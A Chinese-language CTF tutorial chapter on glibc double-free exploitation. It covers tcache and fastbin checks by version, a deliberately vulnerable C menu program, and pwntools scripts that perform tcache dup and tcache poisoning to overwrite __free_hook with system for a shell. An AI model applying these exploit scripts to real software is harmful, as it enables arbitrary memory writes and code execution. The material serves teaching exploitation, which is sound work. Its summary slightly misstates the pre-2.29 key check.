# 第 20 章 Double Free：一物两卖

> 同一块内存被 free 两次，会造成链表里出现「环」。利用这个环，malloc 会返回指向同一地址的两个指针——你可以用其中一个读写，用另一个触发漏洞。

---

## 20.1 什么是 Double Free

**Double Free** 指同一块内存被释放两次：

```c
char *p = malloc(0x20);
free(p);
free(p);   // Double Free！
```

在早期的 glibc（无 tcache、无检查）中，double free 会让 bin 的链表形成环，导致 malloc 返回同一个 chunk 多次。现代 glibc 加入了一些检查，但仍有绕过方式。

---

## 20.2 不同 glibc 版本的 Double Free

### 20.2.1 无 tcache 时代（glibc ≤ 2.25）

fastbin 的 double free 检查很简单：只检查链表头的 chunk 是否和要 free 的 chunk 相同。所以 `free(p); free(p)` 会被拦截，但中间插一个不同的 chunk 就能绕过：

```c
free(a);
free(b);
free(a);   // 绕过：链表头是 b，不是 a
```

### 20.2.2 tcache 时代（glibc ≥ 2.26）

free 的小块先进入 tcache。**glibc 2.29 之前**，tcache 完全不检查 double free，可以直接 `free(p); free(p)`，tcache 链表里就会出现两个相同的指针。

**glibc 2.29+**（包括 2.31、2.35）引入了 **key 检查**：

```c
// free 时的检查（简化）
if (tcache_entry->key == tcache) {
    // 检测到 double free，报错
}
```

每个 tcache chunk 的 `key` 字段（位于 user data + 8）记录它所属的 tcache。free 时如果 key 匹配，说明它已经在 tcache 里了，拒绝再次 free。

绕过方法：**在第二次 free 之前，把 key 字段清掉**（通过 UAF 写或其他漏洞）。

---

## 20.3 tcache dup（glibc 2.31）

假设我们有一个能修改已释放 chunk 内容的漏洞（UAF），可以这样利用：

```text
1. malloc A（大小 0x40）
2. free A → A 进入 tcache[4]，A.fd = NULL, A.key = tcache
3. 通过 UAF 把 A.key 清零
4. free A → 再次进入 tcache，tcache 链表：A → A
5. malloc → 返回 A
6. malloc → 又返回 A（同一块内存！）
```

这样我们得到两个指向同一块内存的指针 `p1` 和 `p2`。通过 `p1` 写入数据，通过 `p2` 可以「看到」同样的数据（因为它们是同一块内存）。

### 20.3.1 进一步：tcache poisoning

如果能在 free 后修改 `fd` 指针（UAF 写），可以让 tcache 链表指向任意地址：

```text
1. free A → A 进入 tcache
2. UAF 写：A.fd = target_addr（伪造）
3. malloc → 返回 A，tcache 链表头变成 target_addr
4. malloc → 返回 target_addr！
```

这样就能在**任意地址**「分配」一个 chunk，从而写入数据。如果 target_addr 是 GOT 表，就能改写函数指针；如果是 `__free_hook`，就能劫持 free。

---

## 20.4 实战例题

### 题目描述

一个程序有 add / delete / edit 功能，delete 后指针没置 NULL，edit 可以修改已释放的 chunk。glibc 2.31。

```c
// doublefree.c
#include <stdio.h>
#include <stdlib.h>

char *chunks[10];

void add(int idx) {
    chunks[idx] = malloc(0x40);
    printf("Data: ");
    read(0, chunks[idx], 0x40);
}

void delete(int idx) {
    free(chunks[idx]);   // 指针没置 NULL
}

void edit(int idx) {
    printf("New data: ");
    read(0, chunks[idx], 0x40);  // UAF 写
}
```

### 利用步骤（tcache dup）

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
p = process('./doublefree')

def add(idx, data):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

def delete(idx):
    p.sendlineafter(b'Choice: ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'New data: ', data)

# 1. 分配并释放 chunk 0
add(0, b'A' * 0x40)
delete(0)

# 2. 通过 UAF 把 key 字段清零（user data + 8 处）
edit(0, b'B' * 8 + p64(0))   # 前 8 字节覆盖 fd（无所谓），后 8 字节清 key

# 3. 再次 free → tcache 中出现两个相同的指针
delete(0)

# 4. 两次 malloc 拿到同一块内存
add(1, b'C' * 0x40)   # 第一次
add(2, b'D' * 0x40)   # 第二次，拿到同一块

# 5. 现在 chunks[1] 和 chunks[2] 指向同一地址
#    可以用 edit(1) 写入数据，然后通过其他途径利用
```

### 进一步：tcache poisoning 到任意地址写

```python
# 1. 释放 chunk 0
add(0, b'A' * 0x40)
delete(0)

# 2. 修改 fd 指向目标地址（比如 __free_hook）
edit(0, p64(free_hook_addr))

# 3. 两次 malloc
add(1, b'X' * 0x40)   # 返回原 chunk
add(2, p64(system_addr))  # 返回 free_hook_addr，写入 system 地址！

# 4. 触发 free("/bin/sh") → system("/bin/sh")
```

> ⚠️ **注意**：glibc 2.34+ 移除了 `__free_hook`，所以需要改用其他目标（如 IO_FILE 结构）。做题前务必确认 libc 版本和可用的 hook。

---

## 20.5 fastbin double free

tcache 满了（7 个）或者 chunk 大小超过 tcache 范围时，free 的 chunk 会进入 fastbin。fastbin 的 double free 利用方式类似：

```text
1. free(a) → fastbin: a
2. free(b) → fastbin: b → a
3. free(a) → fastbin: a → b → a（a 出现两次！）
4. malloc → 返回 a
5. malloc → 返回 b
6. malloc → 又返回 a
```

通过控制第三次 malloc 时写入的 `fd` 指针，可以劫持 fastbin 链表指向任意地址（fastbin attack，下一章）。

---

## 20.6 常见坑

1. **tcache key 检查**：2.29+ 必须绕过 key 检查，否则第二次 free 时程序会报错退出。
2. **tcache 满的状态**：如果 tcache 已经有 7 个同大小 chunk，free 会进入 fastbin/bin，行为不同。
3. **地址对齐**：fastbin attack 要求伪造的地址「看起来像合法的 chunk」（size 字段要符合），tcache attack 则没有这个检查（更宽松）。
4. **glibc 2.35**：移除了 hooks，double free 的最终目标要改用 IO_FILE 或 GOT（如果 Partial RELRO）。

---

## 20.7 小结

这一章我们学了 Double Free：

- **原理**：同一块内存 free 两次，造成链表出现环
- **tcache 时代**（2.26+）：2.29 前有 key 检查漏洞，2.29+ 需要 UAF 清 key 绕过
- **tcache dup**：拿到两个指向同一内存的指针
- **tcache poisoning**：修改 fd 让 malloc 返回任意地址
- **fastbin double free**：tcache 满或大块时使用

下一章我们系统学习 Fastbin Attack——利用 fastbin 链表的漏洞分配到任意地址。

---

**下一章**：[Fastbin Attack](./ch21-Fastbin-Attack.md)
